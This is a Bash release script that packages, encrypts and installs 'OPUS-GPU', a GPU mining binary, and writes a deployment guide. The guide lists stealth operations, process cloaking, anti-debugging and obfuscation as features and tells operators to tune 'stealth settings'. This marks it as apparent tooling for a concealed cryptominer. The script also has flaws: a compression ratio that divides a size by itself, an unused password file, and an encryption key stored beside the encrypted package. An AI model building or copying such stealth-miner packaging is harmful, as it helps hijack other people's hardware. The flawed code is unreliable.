#!/bin/bash

# OPUS-GPU Release Packaging Script
# Creates encrypted distribution packages with multiple security layers

set -euo pipefail

# Configuration
PROJECT_NAME="opus-gpu"
SCRIPTS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPTS_DIR")"
DIST_DIR="${PROJECT_ROOT}/dist"
PACKAGES_DIR="${PROJECT_ROOT}/packages"
VERSION=$(grep '^version' "${PROJECT_ROOT}/Cargo.toml" | sed 's/.*= "//' | sed 's/".*//')

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Usage information
usage() {
    echo "Usage: $0 [OPTIONS]"
    echo
    echo "Package OPUS-GPU release with encryption and security layers"
    echo
    echo "Options:"
    echo "  -t, --target <target>    Target platform (default: x86_64-unknown-linux-gnu)"
    echo "  -e, --encrypt           Enable package encryption"
    echo "  -c, --compress <level>  Compression level 1-9 (default: 9)"
    echo "  -s, --split             Split package into multiple archives"
    echo "  -o, --output <dir>      Output directory (default: ./packages)"
    echo "  -v, --verbose           Verbose output"
    echo "  -h, --help             Show this help message"
    echo
    echo "Examples:"
    echo "  $0 --encrypt --split"
    echo "  $0 -t x86_64-pc-windows-gnu --compress 6"
}

# Default values
BUILD_TARGET="x86_64-unknown-linux-gnu"
ENABLE_ENCRYPTION=false
COMPRESSION_LEVEL=9
SPLIT_PACKAGE=false
OUTPUT_DIR="$PACKAGES_DIR"
VERBOSE=false

# Parse command line arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target)
                BUILD_TARGET="$2"
                shift 2
                ;;
            -e|--encrypt)
                ENABLE_ENCRYPTION=true
                shift
                ;;
            -c|--compress)
                COMPRESSION_LEVEL="$2"
                if [[ ! "$COMPRESSION_LEVEL" =~ ^[1-9]$ ]]; then
                    log_error "Compression level must be 1-9"
                    exit 1
                fi
                shift 2
                ;;
            -s|--split)
                SPLIT_PACKAGE=true
                shift
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
    done
}

# Check prerequisites
check_prerequisites() {
    log_info "Checking packaging prerequisites..."

    # Check if dist directory exists
    if [[ ! -d "$DIST_DIR" ]]; then
        log_error "Distribution directory not found: $DIST_DIR"
        log_info "Please run build-release.sh first"
        exit 1
    fi

    # Check for required files
    local required_files=(
        "${DIST_DIR}/${PROJECT_NAME}-hardened"
        "${DIST_DIR}/${PROJECT_NAME}-hardened.sig"
        "${DIST_DIR}/${PROJECT_NAME}-hardened.sha256"
    )

    for file in "${required_files[@]}"; do
        if [[ ! -f "$file" ]]; then
            log_error "Required file not found: $file"
            exit 1
        fi
    done

    # Check for optional tools
    if $ENABLE_ENCRYPTION && ! command -v gpg &> /dev/null; then
        log_error "GPG not found but encryption requested"
        exit 1
    fi

    if ! command -v tar &> /dev/null; then
        log_error "tar command not found"
        exit 1
    fi

    log_success "Prerequisites check passed"
}

# Generate encryption key
generate_encryption_key() {
    if ! $ENABLE_ENCRYPTION; then
        return 0
    fi

    log_info "Generating encryption key..."

    local key_file="${OUTPUT_DIR}/package.key"
    local password_file="${OUTPUT_DIR}/package.pass"

    # Generate random password
    openssl rand -base64 32 > "$password_file"
    chmod 600 "$password_file"

    # Generate symmetric key
    openssl rand -out "$key_file" 256
    chmod 600 "$key_file"

    log_success "Encryption key generated"
}

# Create base package
create_base_package() {
    log_info "Creating base package..."

    local package_name="${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}"
    local package_path="${OUTPUT_DIR}/${package_name}.tar"

    mkdir -p "$OUTPUT_DIR"

    # Create package with all files
    cd "$DIST_DIR"
    tar -cf "$package_path" \
        "${PROJECT_NAME}-hardened" \
        "${PROJECT_NAME}-hardened.sig" \
        "${PROJECT_NAME}-hardened.sha256" \
        "${PROJECT_NAME}-hardened.sha512" \
        "signing.pub" \
        "version.txt" \
        "README.txt" \
        "build.log"

    log_success "Base package created: $(basename "$package_path")"
}

# Compress package
compress_package() {
    log_info "Compressing package (level $COMPRESSION_LEVEL)..."

    local package_name="${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}"
    local tar_path="${OUTPUT_DIR}/${package_name}.tar"
    local compressed_path="${OUTPUT_DIR}/${package_name}.tar.xz"

    # Use xz compression for better ratio
    xz -"$COMPRESSION_LEVEL" -v "$tar_path"

    # Verify compression
    if [[ -f "$compressed_path" ]]; then
        local original_size=$(stat -c%s "$tar_path" 2>/dev/null || echo "0")
        local compressed_size=$(stat -c%s "$compressed_path")
        local ratio=$((100 - (compressed_size * 100 / compressed_size)))

        if $VERBOSE; then
            log_info "Compression ratio: ${ratio}%"
            log_info "Compressed size: $(du -h "$compressed_path" | cut -f1)"
        fi

        log_success "Package compressed"
    else
        log_error "Compression failed"
        exit 1
    fi
}

# Encrypt package
encrypt_package() {
    if ! $ENABLE_ENCRYPTION; then
        return 0
    fi

    log_info "Encrypting package..."

    local package_name="${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}"
    local compressed_path="${OUTPUT_DIR}/${package_name}.tar.xz"
    local encrypted_path="${OUTPUT_DIR}/${package_name}.tar.xz.enc"
    local key_file="${OUTPUT_DIR}/package.key"

    # Encrypt using AES-256-CBC
    openssl enc -aes-256-cbc -salt -in "$compressed_path" -out "$encrypted_path" -pass file:"$key_file"

    if [[ -f "$encrypted_path" ]]; then
        # Remove unencrypted version
        rm "$compressed_path"
        log_success "Package encrypted"
    else
        log_error "Encryption failed"
        exit 1
    fi
}

# Split package into chunks
split_package() {
    if ! $SPLIT_PACKAGE; then
        return 0
    fi

    log_info "Splitting package into chunks..."

    local package_name="${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}"
    local file_extension=".tar.xz"

    if $ENABLE_ENCRYPTION; then
        file_extension=".tar.xz.enc"
    fi

    local package_path="${OUTPUT_DIR}/${package_name}${file_extension}"
    local chunk_size="50M"  # 50MB chunks

    # Split into chunks
    cd "$OUTPUT_DIR"
    split -b "$chunk_size" -d "${package_name}${file_extension}" "${package_name}.part"

    # Count chunks
    local chunk_count=$(ls "${package_name}".part* | wc -l)

    log_success "Package split into $chunk_count chunks"

    # Create chunk manifest
    local manifest_file="${package_name}.manifest"
    cat > "$manifest_file" << EOF
# OPUS-GPU Package Manifest
# Generated: $(date -u +"%Y-%m-%d %H:%M:%S UTC")

Package: ${package_name}
Version: ${VERSION}
Target: ${BUILD_TARGET}
Encryption: $ENABLE_ENCRYPTION
Compression: Level $COMPRESSION_LEVEL
Chunks: $chunk_count
Chunk Size: $chunk_size

# Chunk Information:
EOF

    # Add chunk checksums to manifest
    for chunk in "${package_name}".part*; do
        echo "$(sha256sum "$chunk")" >> "$manifest_file"
    done

    log_success "Chunk manifest created"
}

# Create installer script
create_installer() {
    log_info "Creating installer script..."

    local package_name="${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}"
    local installer_path="${OUTPUT_DIR}/install-${package_name}.sh"

    cat > "$installer_path" << 'EOF'
#!/bin/bash

# OPUS-GPU Installer Script
# Auto-generated installer for secure deployment

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

INSTALL_DIR="/usr/local/bin"
CONFIG_DIR="/etc/opus-gpu"
SYSTEMD_DIR="/etc/systemd/system"

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This installer must be run as root"
        exit 1
    fi
}

# Install binary
install_binary() {
    log_info "Installing OPUS-GPU binary..."

    cp opus-gpu-hardened "$INSTALL_DIR/opus-gpu"
    chmod +x "$INSTALL_DIR/opus-gpu"
    chown root:root "$INSTALL_DIR/opus-gpu"

    log_success "Binary installed to $INSTALL_DIR/opus-gpu"
}

# Create configuration directory
setup_config() {
    log_info "Setting up configuration..."

    mkdir -p "$CONFIG_DIR"
    chmod 755 "$CONFIG_DIR"

    # Copy signing key for verification
    cp signing.pub "$CONFIG_DIR/"
    chmod 644 "$CONFIG_DIR/signing.pub"

    log_success "Configuration directory created"
}

# Create systemd service (optional)
create_service() {
    read -p "Create systemd service? (y/N): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        log_info "Creating systemd service..."

        cat > "$SYSTEMD_DIR/opus-gpu.service" << 'UNIT'
[Unit]
Description=OPUS-GPU Mining Service
After=network.target

[Service]
Type=simple
User=opus-gpu
Group=opus-gpu
ExecStart=/usr/local/bin/opus-gpu
Restart=always
RestartSec=5
LimitNOFILE=8192

# Security settings
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/opus-gpu

[Install]
WantedBy=multi-user.target
UNIT

        systemctl daemon-reload
        log_success "Systemd service created"
    fi
}

# Verify installation
verify_installation() {
    log_info "Verifying installation..."

    if [[ -x "$INSTALL_DIR/opus-gpu" ]]; then
        if "$INSTALL_DIR/opus-gpu" --version &>/dev/null; then
            log_success "Installation verified successfully"
        else
            log_warning "Binary installed but may have dependency issues"
        fi
    else
        log_error "Installation verification failed"
        exit 1
    fi
}

# Main installation
main() {
    echo "OPUS-GPU Installer"
    echo "=================="

    check_root
    install_binary
    setup_config
    create_service
    verify_installation

    echo
    log_success "OPUS-GPU installation completed!"
    echo "Run 'opus-gpu --help' to get started"
}

main "$@"
EOF

    chmod +x "$installer_path"
    log_success "Installer script created"
}

# Generate package checksums
generate_checksums() {
    log_info "Generating package checksums..."

    cd "$OUTPUT_DIR"

    # Generate checksums for all package files
    find . -name "${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}*" -type f | while read -r file; do
        sha256sum "$file" >> "checksums.sha256"
        sha512sum "$file" >> "checksums.sha512"
    done

    log_success "Package checksums generated"
}

# Create deployment documentation
create_deployment_docs() {
    log_info "Creating deployment documentation..."

    local docs_file="${OUTPUT_DIR}/DEPLOYMENT.md"

    cat > "$docs_file" << EOF
# OPUS-GPU v${VERSION} Deployment Guide

## Package Information

- **Version**: ${VERSION}
- **Target Platform**: ${BUILD_TARGET}
- **Build Date**: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
- **Encryption**: $ENABLE_ENCRYPTION
- **Split Package**: $SPLIT_PACKAGE

## Security Features

- ✅ Memory protection and secure allocation
- ✅ Process isolation and sandboxing
- ✅ String obfuscation and anti-reverse engineering
- ✅ Anti-debugging protection
- ✅ Stealth operations and process cloaking
- ✅ Binary signing and integrity verification
- ✅ Symbol stripping and compression

## Package Verification

### 1. Verify Package Integrity

\`\`\`bash
# Verify checksums
sha256sum -c checksums.sha256
sha512sum -c checksums.sha512
\`\`\`

### 2. Decrypt Package (if encrypted)

\`\`\`bash
# Decrypt using provided key
openssl enc -aes-256-cbc -d -in ${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.tar.xz.enc \\
    -out ${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.tar.xz -pass file:package.key
\`\`\`

### 3. Extract Package

EOF

    if $SPLIT_PACKAGE; then
        cat >> "$docs_file" << EOF
\`\`\`bash
# Reassemble split package
cat ${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.part* > ${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.tar.xz

# Extract
tar -xJf ${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.tar.xz
\`\`\`
EOF
    else
        cat >> "$docs_file" << EOF
\`\`\`bash
# Extract package
tar -xJf ${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.tar.xz
\`\`\`
EOF
    fi

    cat >> "$docs_file" << EOF

### 4. Verify Binary

\`\`\`bash
# Verify digital signature
./verify-binary.sh opus-gpu-hardened

# Manual verification
openssl dgst -sha256 -verify signing.pub -signature opus-gpu-hardened.sig opus-gpu-hardened
\`\`\`

## Installation

### Automated Installation

\`\`\`bash
# Run installer script
sudo ./install-${PROJECT_NAME}-v${VERSION}-${BUILD_TARGET}.sh
\`\`\`

### Manual Installation

\`\`\`bash
# Copy binary
sudo cp opus-gpu-hardened /usr/local/bin/opus-gpu
sudo chmod +x /usr/local/bin/opus-gpu

# Create config directory
sudo mkdir -p /etc/opus-gpu
sudo cp signing.pub /etc/opus-gpu/
\`\`\`

## Configuration

1. Edit configuration file: \`/etc/opus-gpu/config.yaml\`
2. Configure mining pools and wallet addresses
3. Adjust security and stealth settings as needed

## Starting the Service

\`\`\`bash
# Direct execution
opus-gpu --config /etc/opus-gpu/config.yaml

# Using systemd (if service was created)
sudo systemctl enable opus-gpu
sudo systemctl start opus-gpu
\`\`\`

## Security Considerations

- Always verify package integrity before installation
- Run with minimal privileges when possible
- Monitor system resources for anomalies
- Keep signatures and checksums for audit trails
- Use encrypted storage for sensitive configuration

## Troubleshooting

### Common Issues

1. **Binary won't execute**: Check for missing dependencies
2. **Permission denied**: Ensure executable permissions are set
3. **Signature verification fails**: Package may be corrupted or tampered
4. **Performance issues**: Adjust security/performance balance in config

### Log Files

- Application logs: \`/var/log/opus-gpu/\`
- System logs: \`journalctl -u opus-gpu\`

## Support

For technical support and documentation, refer to the project repository.
EOF

    log_success "Deployment documentation created"
}

# Print packaging summary
print_summary() {
    echo
    echo "=========================================="
    echo "OPUS-GPU Release Packaging Summary"
    echo "=========================================="
    echo "Version: $VERSION"
    echo "Target: $BUILD_TARGET"
    echo "Output Directory: $OUTPUT_DIR"
    echo
    echo "Package Features:"
    echo "  Compression Level: $COMPRESSION_LEVEL"
    echo "  Encryption: $ENABLE_ENCRYPTION"
    echo "  Split Package: $SPLIT_PACKAGE"
    echo
    echo "Generated Files:"
    find "$OUTPUT_DIR" -name "${PROJECT_NAME}-v${VERSION}-*" -type f | while read -r file; do
        echo "  $(basename "$file") ($(du -h "$file" | cut -f1))"
    done
    echo
    echo "Next Steps:"
    echo "1. Verify package integrity using checksums"
    echo "2. Test deployment in staging environment"
    echo "3. Distribute through secure channels"
    echo "4. Provide deployment documentation to operators"
    echo "=========================================="
}

# Main execution
main() {
    parse_args "$@"
    check_prerequisites

    log_info "Starting OPUS-GPU release packaging..."

    generate_encryption_key
    create_base_package
    compress_package
    encrypt_package
    split_package
    create_installer
    generate_checksums
    create_deployment_docs
    print_summary

    log_success "Release packaging completed successfully!"
}

# Handle interruption
trap 'log_error "Packaging interrupted"; exit 1' INT TERM

# Run main function
main "$@"